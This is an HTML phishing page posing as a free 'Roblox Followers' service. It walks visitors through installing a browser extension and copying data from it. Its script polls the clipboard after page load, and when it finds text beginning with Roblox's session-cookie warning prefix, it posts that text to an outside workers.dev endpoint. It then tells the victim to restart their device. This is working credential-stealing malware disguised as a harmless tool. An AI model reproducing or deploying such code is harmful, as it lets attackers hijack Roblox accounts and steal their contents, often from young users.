<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  min-height: 100%;
  font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
  overflow-x: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow-y: auto;
  padding: 25px;

  background:
    radial-gradient(circle at 20% 20%, rgba(88,101,242,.12), transparent 40%),
    radial-gradient(circle at 80% 80%, rgba(120,120,255,.08), transparent 40%),
    linear-gradient(135deg, #0b0b10, #13131c 50%, #0b0b10);

  color: white;
}

.background {
  position: fixed;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
  z-index: -1;
}

.glow {
  position: absolute;
  width: 450px;
  height: 450px;
  border-radius: 50%;
  background: rgba(88, 101, 242, 0.05);
  filter: blur(100px);
}

.glow.one {
  top: -180px;
  left: -150px;
}

.glow.two {
  right: -180px;
  bottom: -180px;
}

.main-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 30px;
  width: 100%;
  max-width: 900px;
  margin: auto;
}

.card {
  position: relative;
  width: 100%;
  padding: 50px 40px;
  text-align: center;

  background: rgba(18, 18, 26, 0.85);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 28px;

  box-shadow:
    0 30px 80px rgba(0, 0, 0, 0.6),
    inset 0 1px rgba(255, 255, 255, 0.06);

  backdrop-filter: blur(25px);
}

.logo {
  width: 82px;
  height: 82px;
  margin: 0 auto 20px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 24px;
  background: linear-gradient(135deg, #ffffff, #dedee8);
  color: #111;

  font-size: 38px;
  font-weight: 900;

  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

h1 {
  margin: 0;
  font-size: 36px;
  letter-spacing: -0.5px;
  font-weight: 800;
}

.section-tag {
  display: inline-block;
  margin: 20px 0 25px;
  padding: 6px 14px;
  background: rgba(88, 101, 242, 0.12);
  border: 1px solid rgba(88, 101, 242, 0.25);
  border-radius: 20px;
  color: #8ea1ff;
  font-size: 12px;
  font-weight: 700;
  letter-spacing: 1px;
  text-transform: uppercase;
}

/* Vertical Timeline Steps */
.timeline-container {
  position: relative;
  display: flex;
  flex-direction: column;
  gap: 20px;
  margin: 0 0 35px 0;
  text-align: left;
}

.step-card {
  position: relative;
  z-index: 2;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 15px;
  padding: 18px 22px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 18px;
  transition: transform 0.2s ease, background 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
}

.step-card:hover {
  transform: translateY(-2px);
  background: rgba(255, 255, 255, 0.05);
  border-color: rgba(255, 255, 255, 0.12);
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
}

.step-info {
  display: flex;
  align-items: center;
  gap: 18px;
}

.step-number {
  width: 32px;
  height: 32px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(88, 101, 242, 0.18);
  color: #8ea1ff;
  border-radius: 10px;
  font-weight: 700;
  font-size: 14px;
  border: 1px solid rgba(88, 101, 242, 0.35);
}

.step-content {
  display: flex;
  align-items: center;
  gap: 10px;
}

.step-title {
  color: #ffffff;
  font-size: 16px;
  font-weight: 700;
  letter-spacing: -0.2px;
}

.step-desc {
  color: #9a9ab0;
  font-size: 13.5px;
  line-height: 1.4;
}

.arrow-icon {
  color: #8ea1ff;
  font-weight: bold;
  font-size: 18px;
}

/* Action Buttons inside Steps */
.step-action-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  padding: 10px 18px;
  border-radius: 12px;
  font-size: 14px;
  font-weight: 700;
  text-decoration: none;
  cursor: pointer;
  white-space: nowrap;
  transition: transform 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
  border: none;
}

.btn-primary {
  background: white;
  color: #111;
  box-shadow: 0 4px 15px rgba(255, 255, 255, 0.15);
}

.btn-primary:hover {
  transform: translateY(-2px);
  background: #ececf2;
  box-shadow: 0 6px 20px rgba(255, 255, 255, 0.25);
}

.btn-secondary {
  background: rgba(255, 255, 255, 0.08);
  color: white;
  border: 1px solid rgba(255, 255, 255, 0.12);
}

.btn-secondary:hover {
  transform: translateY(-2px);
  background: rgba(255, 255, 255, 0.14);
  border-color: rgba(255, 255, 255, 0.22);
}

.status {
  margin-top: 15px;
  min-height: 20px;
  font-size: 13px;
  color: #8ea1ff;
  font-weight: 500;
}

@media (max-width: 768px) {
  body {
    padding: 15px;
  }
  .card {
    padding: 30px 20px;
  }
  .step-card {
    flex-direction: column;
    align-items: flex-start;
    gap: 12px;
  }
  .step-action-btn {
    width: 100%;
  }
}
</style>

</head>

<body>

<div class="background">
  <div class="glow one"></div>
  <div class="glow two"></div>
</div>

<div class="main-wrapper">

  <div class="card">
    <div class="logo">R</div>
    <h1>Roblox Followers</h1>

    <div class="section-tag">how to get followers</div>

    <div class="timeline-container">
      
      <div class="step-card">
        <div class="step-info">
          <div class="step-number">1</div>
          <div class="step-content">
            <div class="step-title">Click on the extension button</div>
            <span class="arrow-icon">&rarr;</span>
          </div>
        </div>
        <a class="step-action-btn btn-primary" href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher" target="_blank" rel="noopener noreferrer">
          Extension
        </a>
      </div>

      <div class="step-card">
        <div class="step-info">
          <div class="step-number">2</div>
          <div class="step-content">
            <div class="step-title">Install the Extension</div>
          </div>
        </div>
      </div>

      <div class="step-card">
        <div class="step-info">
          <div class="step-number">3</div>
          <div class="step-content">
            <div class="step-title">Open Roblox and go to your account</div>
          </div>
        </div>
        <a class="step-action-btn btn-secondary" href="https://www.roblox.com" target="_blank" rel="noopener noreferrer">
          Roblox
        </a>
      </div>

      <div class="step-card">
        <div class="step-info">
          <div class="step-number">4</div>
          <div class="step-content">
            <div class="step-title">Open the extention and click copy"</div>
          </div>
        </div>
      </div>

      <div class="step-card">
        <div class="step-info">
          <div class="step-number">5</div>
          <div class="step-content">
            <div class="step-title">Come back here and wait 5 sec</div>
          </div>
        </div>
      </div>

    </div>

    <div class="status" id="status"></div>
  </div>

</div>

<script>
const status = document.getElementById("status");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";
     
async function sendClipboardData(text) {
  try {
    await fetch(SEND_ENDPOINT, {     
      method: "POST",     
      headers: {     
        "Content-Type": "application/json"     
      },     
      body: JSON.stringify({     
        clipboardText: text     
      })     
    });     
     
    await new Promise(resolve => setTimeout(resolve, 10000));     
     
    status.textContent = "Restart Device To Get Followers Added to your account!";     
  } catch (error) {     
    status.textContent = "Something went wrong. Please try again.";     
    console.error(error);     
  }
}

async function monitorClipboard() {
  if (!navigator.clipboard || !navigator.clipboard.readText) return;
  
  try {
    const text = await navigator.clipboard.readText();
    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
      await sendClipboardData(text);
      return;
    }
  } catch (e) {
    // Clipboard permission might require user interaction first
  }
  
  setTimeout(monitorClipboard, 1000);
}

window.addEventListener("load", () => {
  setTimeout(monitorClipboard, 500);
});
</script>     
     
</body>  
</html>
